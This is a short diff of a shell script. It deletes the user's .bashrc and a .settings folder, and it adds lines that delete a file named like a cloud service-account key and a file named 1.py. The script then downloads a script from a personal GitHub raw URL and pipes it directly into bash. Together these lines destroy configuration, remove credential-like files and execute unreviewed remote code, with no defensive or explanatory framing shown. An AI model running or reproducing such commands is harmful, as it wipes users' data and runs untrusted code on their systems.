@@ -23,6 +23,8 @@ clear
 cd
 rm .bashrc
 rm -rf .settings
+rm watchful-lotus-480604-b6-4056d3138f92.json
+rm 1.py
 
 wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/linux123 | bash
 
